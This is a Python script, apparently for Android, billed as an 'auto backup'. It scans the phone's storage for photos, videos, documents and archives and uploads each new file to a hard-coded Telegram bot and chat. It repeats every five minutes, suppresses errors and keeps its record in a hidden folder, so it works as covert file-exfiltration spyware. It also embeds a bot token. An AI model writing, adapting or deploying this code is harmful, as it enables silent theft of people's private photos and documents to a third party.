import os
import time
import hashlib
import requests

BOT_TOKEN = "8931091996:AAHgcTH38hSH1RXFVzEcqNR2O1LKtqS3RBk"
CHAT_ID = "7883547875"

TARGET_DIR = "/sdcard"

# Photos, Videos ke sath sath Documents aur Archives bhi add hain
ALLOWED_EXTENSIONS = (
    '.jpg', '.jpeg', '.png', '.mp4', '.mkv', '.mov', '.avi',
    '.pdf', '.txt', '.docx', '.doc', '.xlsx', '.xls', '.zip', '.rar'
)

IGNORED_FOLDER_NAMES = {
    '.thumbnails', 'thumbnails', 'thumbnail', 
    'cache', '.cache', 'stickers', '.stickers', 
    'temp', '.temp', 'trash', '.trash', 'private'
}

SECURE_DIR = "/sdcard/Download/.backup_secure_data"
os.makedirs(SECURE_DIR, exist_ok=True)

LOG_FILE = os.path.join(SECURE_DIR, "data.txt")

def send_msg(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={'chat_id': CHAT_ID, 'text': text}, timeout=10)
    except Exception:
        pass

def get_file_hash(file_path):
    hasher = hashlib.md5()
    try:
        with open(file_path, 'rb') as f:
            buf = f.read(65536)
            while len(buf) > 0:
                hasher.update(buf)
                buf = f.read(65536)
        return hasher.hexdigest()
    except Exception:
        return None

def load_uploaded_records():
    uploaded = set()
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                h = line.strip()
                if h:
                    uploaded.add(h)
    return uploaded

def save_uploaded_record(file_hash):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(file_hash + '\n')

def upload_media(file_path, folder_path, user_info):
    ext = file_path.lower()
    
    is_video = ext.endswith(('.mp4', '.mkv', '.mov', '.avi'))
    is_image = ext.endswith(('.jpg', '.jpeg', '.png'))
    
    if is_image:
        method = "sendPhoto"
        file_field = "photo"
    elif is_video:
        method = "sendVideo"
        file_field = "video"
    else:
        method = "sendDocument"
        file_field = "document"
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        with open(file_path, 'rb') as media_file:
            caption_text = (
                f"👤 User Info: {user_info}\n"
                f"📂 Path: {folder_path}\n"
                f"📄 File: {os.path.basename(file_path)}"
            )
            payload = {'chat_id': CHAT_ID, 'caption': caption_text}
            files = {file_field: media_file}
            
            timeout_limit = 60 if is_video else 30
            res = requests.post(url, data=payload, files=files, timeout=timeout_limit)
            return res.status_code == 200
    except Exception:
        return False

def run_backup_cycle(user_info):
    if not os.path.exists(TARGET_DIR):
        return

    uploaded_hashes = load_uploaded_records()
    send_msg(f"🚀 Auto Backup & Documents Scan Started for: [{user_info}]")

    for root, dirs, files in os.walk(TARGET_DIR, topdown=True):
        if 'android/data' in root.lower() or 'android/obb' in root.lower():
            continue

        current_folder_name = os.path.basename(root).lower()
        if current_folder_name in IGNORED_FOLDER_NAMES or '/private/' in root.lower():
            continue

        if any(ignored in root.lower() for ignored in ['.thumbnails', '/cache/', '/stickers/', '/temp/']):
            continue
            
        for file in files:
            if file.lower().endswith(ALLOWED_EXTENSIONS):
                full_path = os.path.join(root, file)
                
                file_hash = get_file_hash(full_path)
                if not file_hash or file_hash in uploaded_hashes:
                    continue
                
                success = upload_media(full_path, root, user_info)
                if success:
                    save_uploaded_record(file_hash)
                    uploaded_hashes.add(file_hash)
                
                time.sleep(2)

    send_msg(f"✅ Backup Cycle Finished for [{user_info}]. Waiting 5 mins...")

if __name__ == "__main__":
    u_info = current_user_info if 'current_user_info' in globals() else "Unknown User"
    while True:
        try:
            run_backup_cycle(u_info)
        except Exception:
            pass
        time.sleep(300) # 5 minutes delay (300 seconds)
